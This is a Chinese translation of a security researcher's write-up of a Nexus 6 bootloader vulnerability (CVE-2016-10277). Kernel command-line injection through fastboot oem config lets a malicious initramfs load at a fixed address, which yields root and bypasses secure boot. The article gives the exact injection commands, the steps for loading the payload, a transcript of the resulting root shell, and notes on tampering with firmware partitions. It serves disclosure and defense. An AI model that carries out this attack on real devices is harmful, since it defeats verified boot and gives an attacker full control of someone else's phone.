> 原文链接: https://www.anquanke.com//post/id/86182 


# 【漏洞分析】如何通过内核命令注入绕过Nexus 6的安全启动模式（含演示视频）


                                阅读量   
                                **132168**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：alephsecurity.com
                                <br>原文地址：[https://alephsecurity.com/2017/05/23/nexus6-initroot/](https://alephsecurity.com/2017/05/23/nexus6-initroot/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01c4969c1fd9a2d2e7.jpg)](https://p0.ssl.qhimg.com/t01c4969c1fd9a2d2e7.jpg)



翻译：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

在2017年5月的[Android安全公告](https://source.android.com/security/bulletin/2017-05-01#eop-in-motorola-bootloader)中，Google发布了一个安全补丁，修复了我们之前在Nexus 6的bootloader中发现的一个严重的漏洞（[CVE-2016-10277](https://alephsecurity.com/vulns/aleph-2017011)）。

利用这个漏洞，物理攻击者或者某个已拥有（bootloader锁定下）目标设备ADB/fastboot USB访问权限的用户（比如恶意软件可以等待具备ADB权限的开发者设备通过USB接口插入主机）能够打破设备的安全（或已验证的）启动机制，通过加载一个精心构造的恶意initramfs镜像，攻击者可以获得目标设备的root权限，完全控制设备的用户空间（在这个空间可以实施更多攻击）。此外，漏洞利用过程并不会导致设备恢复到出厂设置，因此用户数据会保持不变（并且仍然处于加密状态）。需要注意的是，我们所演示的并不是一个不受任何条件限制的攻击过程。

在漏洞研究过程中，我们同时也[发现](https://alephsecurity.com/2017/05/23/nexus6-initroot/#anecdote-a-linux-kernel-out-of-bounds-write-cve-2017-1000363)了一个已有18年历史的Linux内核漏洞（漏洞不会对Nexus 6造成影响，因此可能不会影响任何Android设备）：[CVE-2017-1000363](https://alephsecurity.com/vulns/aleph-2017023)。

在本文开始前，我们可以先看一下PoC演示视频：



<br>

**一、前言**

2017年1月，我们[披露](https://alephsecurity.com/2017/01/05/attacking-android-custom-bootmodes/)了一个高危漏洞（[CVE-2016-8467](https://alephsecurity.com/vulns/aleph-2016002)），这个漏洞影响Nexus 6/6P，允许攻击者改变设备的启动模式，从而能够访问设备的隐藏USB接口。漏洞通过fastboot命令触发（比如fastboot oem config bootmode bp-tools），该命令会导致bootloader改变内核命令行中的androidboot.mode参数。Google通过加固bootloader修复了这个漏洞，锁定后的bootloader再也不支持自定义启动模式启动。

<br>

**二、漏洞分析：内核命令注入漏洞（CVE-2016-10277）**

Nexus 6的bootloader中包含许多参数，其中某些参数可以通过fastboot接口进行控制，即使bootloader被锁定也可以：



```
$ fastboot oem config
[...]
(bootloader) &lt;UTAG name="battery" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     Battery detection control
(bootloader)     ("meter_lock" or "no_eprom")
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
(bootloader) &lt;UTAG name="bootmode" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     To force certain bootmode
(bootloader)     (valid values are "fastboot", "factory", "bp-tools", "q
(bootloader)     com", and "on-device-diag")
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
(bootloader) &lt;UTAG name="carrier" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     Carrier IDs, see http://goo.gl/lojLh3
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
(bootloader) &lt;UTAG name="console" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     Config kernel console log
(bootloader)       enable|true     - enable with default settings
(bootloader)       disable|false   - disable
(bootloader)       &lt;config string&gt; - enable with customized settings
(bootloader)       (e.g.: "ttyHSL0", "ttyHSL0,230400,n8")
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
(bootloader) &lt;UTAG name="fsg-id" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
OKAY [  0.048s]
finished. total time: 0.048s
```

fsg-id、carrier以及console这三个参数可以包含任意值（虽然参数的大小受到限制），这三个参数最终会被传递到内核命令行。我们可以使用以下命令来验证这个漏洞：



```
$ fastboot oem config console foo
$ fastboot oem config fsg-id bar
$ fastboot oem config carrier baz
```

然后检查内核命令行：



```
shamu:/ $ dmesg | grep command
[    0.000000] Kernel command line: console=foo,115200,n8 earlyprintk 
androidboot.console=foo androidboot.hardware=shamu msm_rtb.filter=0x37
ehci-hcd.park=3 utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags
utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup coherent_pool=8M
vmalloc=300M buildvariant=user androidboot.bootdevice=msm_sdcc.1 androidboot.serialno=ZX1G427V97
androidboot.baseband=mdm androidboot.version-baseband=D4.01-9625-05.45+FSG-9625-02.117
androidboot.mode=normal androidboot.device=shamu androidboot.hwrev=0x83A0
androidboot.radio=0x7 androidboot.powerup_reason=0x00004000 androidboot.bootreason=reboot
androidboot.write_protect=0 restart.download_mode=0 androidboot.fsg-id=bar
androidboot.secure_hardware=1 androidboot.cid=0xDE androidboot.wifimacaddr=F8:CF:C5:9F:8F:EB
androidboot.btmacaddr=F8:CF:C5:9F:8F:EA mdss_mdp.panel=1:dsi:0:qcom,mdss_dsi_mot_smd_596_QHD_dualmipi0_cmd_v0
androidboot.bootloader=moto-apq8084-72.02 androidboot.carrier=baz androidboot.hard&lt;
```

现在，如果bootloader没有对这些参数进行过滤处理，那么我们就能传递任意内核内核命令行参数：



```
$ fastboot oem config console "a androidboot.foo=0 "
$ fastboot oem config fsg-id "a androidboot.bar=1"
$ fastboot oem config carrier "a androidboot.baz=2"
```

结果的确如此：



```
shamu:/ $ dmesg | grep command
[    0.000000] Kernel command line: console=a androidboot.foo=0 ,115200,n8 earlyprintk 
androidboot.console=a androidboot.foo=0  androidboot.hardware=shamu msm_rtb.filter=0x37
ehci-hcd.park=3 utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags
utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup coherent_pool=8M
vmalloc=300M buildvariant=user androidboot.bootdevice=msm_sdcc.1 androidboot.serialno=ZX1G427V97
androidboot.baseband=mdm androidboot.version-baseband=D4.01-9625-05.45+FSG-9625-02.117
androidboot.mode=normal androidboot.device=shamu androidboot.hwrev=0x83A0
androidboot.radio=0x7 androidboot.powerup_reason=0x00004000 androidboot.bootreason=reboot
androidboot.write_protect=0 restart.download_mode=0 androidboot.fsg-id=a androidboot.bar=1
androidboot.secure_hardware=1 androidboot.cid=0xDE androidboot.wifimacaddr=F8:CF:C5:9F:8F:EB
androidboot.btmacaddr=F8:CF:C5:9F:8F:EA mdss_mdp.panel=1:dsi:0:qcom,mdss_dsi_mot_smd_596_QHD_dualmipi0_cmd_v0
androidboot.bootloader=moto-apq8084-72.02 androidboot.carrier=a androidboot.baz=2 androidboot.hard&lt;
```

正如我们所料，我们可以将ro.boot属性设为任意值：



```
shamu:/ $ getprop ro.boot.foo
0
shamu:/ $ getprop ro.boot.bar
1
shamu:/ $ getprop ro.boot.baz
2
shamu:/ $
```



**三、绕过CVE-2016-8467的补丁**

到目前为止，我们可以轻易绕过[CVE-2016-8467](https://alephsecurity.com/vulns/aleph-2016002)的补丁：



```
$ fastboot oem config console "a androidboot.mode=bp-tools "
[...]
(bootloader) &lt;UTAG name="conolse" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)     a androidboot.mode=bp-tools
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     Carrier IDs, see http://goo.gl/lojLh3
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
[...]
```

结果正如我们所料：



```
shamu:/ $ getprop ro.boot.mode
bp-tools
shamu:/ $
```

需要注意的是，我们必须更改console参数，这样才能击败真正的androidboot.mode参数（该参数由bootloader插入，负责处理init进程的内核命令行的代码位于“core/init/init.cpp!import_kernel_nv“中）。

<br>

**四、一个全新的攻击面**

在整个操作系统中，有多个实体使用了内核命令行，包括：

1、内核代码中的__setup宏。

2、内核代码中的early_param宏。

3、内核模块代码中的module_param宏。

4、内核模块代码中的core_param宏。

5、用户空间中的某些实体（比如init，如上文所述）。

这些宏即使没有被引用过上百次，也被使用过很多次，我们可以控制这些宏，对任何包含这些宏的系统功能造成影响。接下来，让我们看看如何通过控制单个变量，击败设备的安全启动模式。

<br>

**五、Nexus6的安全启动模式**

高通MSM设备（比如摩托罗拉Nexus 6）的启动过程如下所示（当然经过了相当多的精简）：

[![](https://p5.ssl.qhimg.com/t0170f7ad6f8f6f80a3.png)](https://p5.ssl.qhimg.com/t0170f7ad6f8f6f80a3.png)

设备通电后，ROM中的PBL就会开始工作，然后它会将经过数字签名的SBL加载到内存中，并验证SBL的真实性。SBL会加载经过数字签名的ABOOT（ABOOT实现了fastboot接口），并也会验证ABOOT的真实性。SBL和ABOOT的签名证书以存储在硬件中的根证书为基础。

ABOOT随后会验证boot或者recovery镜像的真实性，从boot或recovery镜像的固定的物理地址（该地址在Nexus 6中为0x8000以及0x2000000）中加载Linux内核以及initramfs。initramfs是一个cpio格式（即经过gzip压缩）的归档文件，会在Linux内核初始化过程中被加载到rootfs中（rootfs是挂载到/目录的RAM文件系统）。initramfs包含init程序，该程序是用户空间的第一个进程。

bootloader（ABOOT）为Linux内核准备内核命令以及initramfs参数，Linux内核位于设备树二进制大对象（Device Tree Blob，DTB）中，其物理地址为0x1e00000。我们可以将内存中的DTB导出到硬盘中，使用fdtdump解析这块数据以验证这一点：



```
[...]
linux,initrd-end = &lt;0x02172814&gt;;
linux,initrd-start = &lt;0x02000000&gt;;
bootargs = "console=ttyHSL0,115200,n8 earlyprintk androidboot.console=ttyHSL0 androidboot.hardware=shamu msm_rtb.filter=0x37 ehci-hcd.park=3 
utags.blkdev=/dev/block/platform/msm_sdcc.1/by-name/utags utags.backup=/dev/block/platform/msm_sdcc.1/by-name/utagsBackup coherent_pool=8M 
vmalloc=300M buildvariant=userdebug androidboot.bootdevice=msm_sdcc.1 androidboot.serialno=ZX1G427V97 androidboot.baseband=mdm
[...]
```

之后bootloader会将执行权交给Linux内核。

<br>

**六、Linux内核初始化：从ABOOT到init**

Linux内核中，early_init_dt_scan_chosen函数负责解析由DTB中的ABOOT传递过来的参数。在arm内核中，该函数最终会调用如下函数：



```
void __init early_init_dt_setup_initrd_arch(unsigned long start, unsigned long end)
`{`
phys_initrd_start = start;
phys_initrd_size = end - start;
`}`
```

phys_initrd_start定位物理内存地址，这片物理内存会通过如下代码映射到虚拟地址空间中：



```
void __init arm_memblock_init(struct meminfo *mi, struct machine_desc *mdesc)
`{`
[...]
if (phys_initrd_size) `{`
memblock_reserve(phys_initrd_start, phys_initrd_size);
/* Now convert initrd to virtual addresses */
initrd_start = __phys_to_virt(phys_initrd_start);
initrd_end = initrd_start + phys_initrd_size;
`}`
[...]
`}`
```

接下来，initramfs会被解压到rootfs中：



```
static int __init populate_initramfs(void)
`{`
[...]
   if (initrd_start) `{`
#ifdef CONFIG_BLK_DEV_RAM
int fd;    
err = unpack_to_initramfs((char *)initrd_start,
initrd_end - initrd_start);
if (!err) `{`
free_initrd();
goto done;
`}` else `{`
clean_initramfs();
unpack_to_initramfs(__initramfs_start, __initramfs_size);
`}`
[...]
   `}`
   return 0;
`}`
initramfs_initcall(populate_initramfs);
```

最后kernel_init函数会被调用，该函数会执行用户空间中的第一个进程：/init。



```
static int __ref kernel_init(void *unused)
`{`
[...]
if (ramdisk_execute_command) `{`
if (!run_init_process(ramdisk_execute_command))
return 0;
pr_err("Failed to execute %sn", ramdisk_execute_command);
`}`
[...]
`}`
```

注：ramdisk_execute_command的默认值为/init。

<br>

**七、用户空间的初始化以及dm-verity**

init负责带动整个用户空间。该程序的职责之一就是设置SELinux（负责加载策略等）。一旦策略加载完毕，init会位于kernel域中，但SELinux初始化完成后不久，该进程就会转移到init域中。请注意，对于发布版系统而言，即便内核没有使用强制（enforcing）模式下的SELinux进行加载（比如，我们可以在内核命令行中使用androidboot.selinux=permissive参数实现这一点），init还是会重新设置enforce模式：



```
static void selinux_initialize(bool in_kernel_domain) `{`
[...]
    if (in_kernel_domain) `{`
        INFO("Loading SELinux policy...n");
[...]
        bool kernel_enforcing = (security_getenforce() == 1);
        bool is_enforcing = selinux_is_enforcing();
        if (kernel_enforcing != is_enforcing) `{`
            if (security_setenforce(is_enforcing)) `{`
                ERROR("security_setenforce(%s) failed: %sn",
                      is_enforcing ? "true" : "false", strerror(errno));
                security_failure();
            `}`
        `}`
[...]
    `}`
`}`
```

注：发布版系统中，selinux_is_enforce()始终返回true。

init也会触发分区挂载动作。dm-verity稍后会使用存放在initramfs目录（/verity_key）中的某个公钥来验证相关分区（比如system分区）的完整性，这样一来，某个不受信任的initramfs就意味着某个不受信任的system分区。

那么，已知内核命令行存在注入漏洞，攻击者如何利用这个漏洞干扰上述的启动过程呢？

<br>

**八、失败的尝试：控制ramdisk_execute_command**

事实证明，有一个内核命令行参数（rdinit）会覆盖/init，也就是ramdisk_execute_command的默认值：



```
static int __init rdinit_setup(char *str)
`{`
unsigned int i;
ramdisk_execute_command = str;
/* See "auto" comment in init_setup */
for (i = 1; i &lt; MAX_INIT_ARGS; i++)
argv_init[i] = NULL;
return 1;
`}`
__setup("rdinit=", rdinit_setup);
```

看起来很有希望，通过利用这个漏洞，我们可以让内核执行用户空间的任意进程，类似命令为：fastboot oem config carrier "a rdinit=/sbin/foo"。然而，我们无法有效控制rdinit，最主要的问题就是Nexus 6的initramfs只包含数量非常有限的几个程序：



```
$ ls -la sbin
adbd  healthd  slideshow ueventd  watchdogd
```

即便其中某个程序（比如 adbd）具备挖掘的潜力，此时用户空间仍然没有被初始化，因此这些程序可能会因为依赖条件未被满足而无法启动。前面我们分析过，漏洞的攻击面比较广，因此我们决定继续搜寻下一个可以控制的命令行参数，不去理会上述这些程序是否真的可以用于漏洞利用过程。

<br>

**九、控制initramfs的物理加载地址**

非常有趣的是，对于arm而言，我们认识到我们有可能通过内核命令行参数initrd来控制某个物理地址，而恰好内核会从这个物理地址加载initramfs！

arch/arm/mm/init.c中的代码如下：



```
static int __init early_initrd(char *p)
`{`
unsigned long start, size;
char *endp;
start = memparse(p, &amp;endp);
if (*endp == ',') `{`
size = memparse(endp + 1, NULL);
phys_initrd_start = start;
phys_initrd_size = size;
`}`
return 0;
`}`
early_param("initrd", early_initrd);
```

这将覆盖DTB中的ABOOT所提供的默认值。我们使用一个随机值来测试，希望该值会导致内核崩溃：



```
$ fastboot oem config fsg-id "a initrd=0x33333333,1024"
[...]
(bootloader) &lt;UTAG name="fsg-id" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)     a initrd=0x33333333,1024
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
OKAY [  0.016s]
finished. total time: 0.016s
$ fastboot continue
```

内核的确崩溃了！

这类攻击的原理类似于在内存损坏漏洞中所使用的控制指令指针（IP寄存器，IP代表Instruction Point）或者程序计数器（PC寄存器，PC代表Program Counter）的原理，因此当前最紧要的第一步，就是利用fastboot，将经过我们修改的initramfs存档加载到设备内存中。

需要注意的是，Linux内核不会重新检查initramfs的真实性，它依赖bootloader来完成这一任务，因此如果我们设法将修改过的initramfs存放到可控的phys_initrd_start物理地址上，内核的确会将其填充到rootfs中。

<br>

**十、通过USB将任意数据载入内存中**

ABOOT的fastboot提供了一个使用USB进行下载的机制，该机制支持固件刷写（flashing）功能。在锁定的bootloader中，下载功能依然可以使用，因此攻击者可以使用这个功能将被修改过的initramfs载入设备。我们唯一的希望就是，在initramfs被填充到rootfs之前，bootloader和内核不会将这些数据填充为0或者覆盖这些数据。为了验证这一点，我们做了如下实验。首先，我们安装了自定义的msm-shamu内核，该内核具备LKM（Loadable-Kernel Modules，可加载内核模块）功能。然后，我们通过fastboot将一大段数据（0123456789ABCDEFALEFALEFALEF…）上传到设备中：



```
$ fastboot flash aleph payload.bin
[...]
target reported max download size of 536870912 bytes
sending 'aleph' (524288 KB)...
OKAY [ 62.610s]
writing 'aleph'...
(bootloader) Not allowed in LOCKED state!
FAILED (remote failure)
finished. total time: 62.630s
```

请注意，出现错误信息是因为我们试图刷写固件，然而设备的确下载了这些数据。

我们通过fastboot continue启动了平台，然后使用[LiME LKM](https://github.com/504ensicsLabs/LiME)工具将整个物理内存导出，从中搜寻我们上传的数据。



```
10FFFFC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
10FFFFD0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
10FFFFE0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
10FFFFF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
11000000  30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46  0123456789ABCDEF
11000010  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000020  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000030  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000040  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
11000050  41 4C 45 46 41 4C 45 46 41 4C 45 46 41 4C 45 46  ALEFALEFALEFALEF
```

因此我们知道，即使平台已经加载并运行起来，我们的载荷也能存活下来。我们多次重复了这个过程，没有任何差错出现，载荷始终加载到0x11000000这个地址，并且Linux内核总是可以使用这个地址。

出于好奇心，我们也使用静态分析方式验证了这个结果。事实证明，Nexus 6所使用的小型内核（Little Kernel，LK）中，SCRATCH_ADDR指向了一块内存区域，下载的数据正是保存在这片区域中。我们使用IDA加载ABOOT程序，进一步确认了这个结果（为了便于阅读，我们重命名了函数）：



```
int fastboot_mode()
`{`
[...]
  dprintf(1, "Entering fastboot moden");
[...]
  v8 = return11000000();
  v9 = return20000000();
  fastboot_init(v8, v9);
  v11 = sub_FF2EA94(v10);
  if ( v13 != v10021C84 )
    sub_FF3D784();
  return sub_FF15BA4(v11);
`}`
signed int return11000000()
`{`
  signed int result; // r0@1
  result = 0x11000000;
  if ( v10021C84 != v10021C84 )
    sub_FF3D784();
  return result;
`}`
```

该值最终被ABOOT的下载处理程序所使用。

总而言之，内存中的initramfs存档被填充到rootfs之前，物理内存的布局如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018c5aceb9728808f7.png)

现在我们可以将自己的initramfs放到某个固定的物理地址上，然后指导内核填充它。

<br>

**十一、创建恶意的initramfs**

最后一个步骤就是创建我们的恶意initramfs。我们可以编译一个userdebug AOSP启动镜像，删掉其中的initramfs.cpio.gz文件，因为这个文件包含su域以及一个root可用的adbd。只有dm-verity会发出唯一的警告，因为它无法验证官方的system分区（因为AOSP启动镜像会包含调试版的verity_key）。无论如何，既然我们现在可以加载一个恶意的initramfs，我们就可以修改fstab文件（删除验证过程），简单地绕过这个难题，或者我们可以将调试版的verity_key替换为相应的官方发行版。

读者可以从我们的[GitHub仓库](https://github.com/alephsecurity/research/tree/master/initroot)中找到用于PoC演示的initramfs。

<br>

**十二、获取root权限**

现在一切条件已经准备就绪：

1、我们有了一个恶意的initramfs存档。

2、我们可以使用fastboot接口，从固定的物理地址上将initramfs载入内存中。

3、我们可以引导Linux内核填充这个initramfs。

对于安全启动流程来说，信任关系已被破坏，如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a82a765759739630.png)

成功的攻击过程如下所示：



```
$ adb shell
shamu:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
shamu:/ $ getenforce
Enforcing
shamu:/ $ setenforce permissive
setenforce: Couldn't set enforcing status to 'permissive': Permission denied
shamu:/ $ reboot bootloader
$ fastboot getvar unlocked
[...]
unlocked: no
finished. total time: 0.008s
$ fastboot oem config fsg-id "a initrd=0x11000000,1518172"
[...]
(bootloader) &lt;UTAG name="fsg-id" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)     a initrd=0x11000000,1518172
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
OKAY [  0.016s]
finished. total time: 0.016s
$ fastboot flash aleph malicious.cpio.gz
[...]
target reported max download size of 536870912 bytes
sending 'aleph' (1482 KB)...
OKAY [  0.050s]
writing 'aleph'...
(bootloader) Not allowed in LOCKED state!
FAILED (remote failure)
finished. total time: 0.054s
$ fastboot continue
[...]
resuming boot...
OKAY [  0.007s]
finished. total time: 0.007s
$ adb shell
shamu:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
shamu:/ # getenforce
Enforcing
shamu:/ # setenforce permissive
shamu:/ # getenforce
Permissive
shamu:/ #
```



**十三、超越initramfs：固件注入**

现在我们已经完全控制了rootfs，我们可以创建一个恶意的/vendor目录，这个目录通常会包含当前设备可用的各种SoC固件镜像：



```
shamu:/ # ls /vendor/firmware
VRGain.bin adsp.b03 adsp.b11 bcm20795_firmware.ncd left.boost.music.eq left.boost_n1b12.patch right.boost.ringtone.eq right.boost_ringtone_table.preset venus.mdt
a420_pfp.fw adsp.b04 adsp.b12 bcm4354A2.hcd left.boost.ringtone.config left.boost_n1c2.patch right.boost.speaker right.boost_voice_table.preset widevine.b00
a420_pm4.fw adsp.b05 adsp.mdt cy8c20247_24lkxi.hex left.boost.ringtone.eq left.boost_ringtone_table.preset right.boost.voice.config venus.b00 widevine.b01
acdb.mbn adsp.b06 aonvr1.bin fw_bcmdhd.bin left.boost.speaker left.boost_voice_table.preset right.boost.voice.eq venus.b01 widevine.b02
adsp.b00 adsp.b07 aonvr2.bin fw_bcmdhd_apsta.bin left.boost.voice.config right.boost.music.config right.boost_music_table.preset venus.b02 widevine.b03
adsp.b01 adsp.b08 atmel-a432-14061601-0102aa-shamu-p1.tdat keymaster left.boost.voice.eq right.boost.music.eq right.boost_n1b12.patch venus.b03 widevine.mdt
adsp.b02 adsp.b10 atmel-a432-14103001-0103aa-shamu.tdat left.boost.music.config left.boost_music_table.preset right.boost.ringtone.config right.boost_n1c2.patch venus.b04
```

内核驱动通常会在初始化是使用这些镜像，并在需要的时候更新他们的SoC副本。因此，攻击者可以写入未签名的固件镜像。我们没有确认这种攻击场景是否有效，但根据我们对其他设备的经验，这种场景应该是没问题的。对于签名的固件来说，攻击者可以利用这种方式实现降级攻击。此外，调制解调器固件位于/firmware/image目录下，理论上讲，我们可以通过修改这个目录（如下所示）完成类似攻击。同样，我们也没有去验证设备是否存在某种完整性检查机制，以及设备是否会受到降级攻击，我们可以在未来工作中研究这个问题。



```
shamu:/ # umount -f /firmware
shamu:/ # mount  /dev/block/mmcblk0p1 /firmware -o rw
shamu:/ # ls /firmware/image
acdb.mbn bdwlan20.bin cmnlib.b03 efs1.bin isdbtmm.b01 mba_9225.mbn.gz playready.b00 playready.mdt prov.b03 qwlan11.bin sampleapp.b00 sampleapp.mdt securemm.b01 tqs.b00 tqs.mdt utf20.bin
apps_9225.mbn.gz cmnlib.b00 cmnlib.mdt efs2.bin isdbtmm.b02 mba_9625.mbn.gz playready.b01 prov.b00 prov.mdt qwlan20.bin sampleapp.b01 sbl1_9225.mbn.gz securemm.b02 tqs.b01 tz_9225.mbn.gz
apps_9625.mbn.gz cmnlib.b01 dsp2_9225.mbn.gz efs3.bin isdbtmm.b03 otp11.bin playready.b02 prov.b01 qdsp6sw_9225.mbn.gz rpm_9225.mbn.gz sampleapp.b02 sbl1_9625.mbn.gz securemm.b03 tqs.b02 tz_9625.mbn.gz
bdwlan11.bin cmnlib.b02 dsp2_9625.mbn.gz isdbtmm.b00 isdbtmm.mdt otp20.bin playready.b03 prov.b02 qdsp6sw_9625.mbn.gz rpm_9625.mbn.gz sampleapp.b03 securemm.b00 securemm.mdt tqs.b03 utf11.bin
shamu:/ # echo foo &gt; /firmware/image/foo
shamu:/ # cat /firmware/image/foo
foo
```



**十四、Google的补丁**

Google在2017年5月的[安全公告](http://7%E5%B9%B45%E6%9C%88%E7%9A%84%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A%E4%B8%AD%E5%8F%91%E5%B8%83%E4%BA%86%E8%BF%99%E4%B8%AA)中发布了这个漏洞的补丁。N6F27C版系统中Bootloader版本已升级至moto-apq8084-72.03，这版Bootloader会对fsg-id、carrier以及console的配置参数进行过滤处理：



```
$ fastboot oem config fsg-id "foo foo=1"
[...]
$ fastboot oem config carrier "bar bar=1"
[...]
$ fastboot oem config carrier "baz baz=1"
[...]
$ fastboot oem config
[android@aosp:/aosp/source/android-7.1.1_r40]$ fastboot oem config
[...]
(bootloader) &lt;UTAG name="carrier" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)     bar
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     Carrier IDs, see http://goo.gl/lojLh3
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
(bootloader) &lt;UTAG name="console" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)     baz
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     Config kernel console log
(bootloader)       enable|true     - enable with default settings
(bootloader)       disable|false   - disable
(bootloader)       &lt;config string&gt; - enable with customized settings
(bootloader)       (e.g.: "ttyHSL0", "ttyHSL0,230400,n8")
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;
(bootloader) &lt;UTAG name="fsg-id" type="str" protected="false"&gt;
(bootloader)   &lt;value&gt;
(bootloader)     foo
(bootloader)   &lt;/value&gt;
(bootloader)   &lt;description&gt;
(bootloader)     FSG IDs, see http://goo.gl/gPmhU
(bootloader)   &lt;/description&gt;
(bootloader) &lt;/UTAG&gt;]
```



**十五、题外话：Linux内核越界写入漏洞（CVE-2017-1000363）**

在本次研究过程中，我们意外发现了另一个漏洞（[CVE-2017-1000363](https://alephsecurity.com/vulns/aleph-2017023)），这是Linux内核中的一个越界写入漏洞，历史非常久远（从2.2.0版本起就已经存在！）。漏洞位于lp驱动中（因此内核参数需为CONFIG_PRINTER=y），当许多lp=none参数被附加到内核命令行中时该漏洞就会被触发：



```
static int parport_nr[LP_NO] = `{` [0 ... LP_NO-1] = LP_PARPORT_UNSPEC `}`;
[...]
#ifndef MODULE
static int __init lp_setup (char *str)
`{`
static int parport_ptr;
[...]
`}` else if (!strcmp(str, "none")) `{`
parport_nr[parport_ptr++] = LP_PARPORT_NONE;
`}` 
[...]
`}`
#endif
[...]
__setup("lp=", lp_setup);
```

相应的[补丁](https://alephsecurity.com/vulns/aleph-2017023)已经提交到主线内核上。
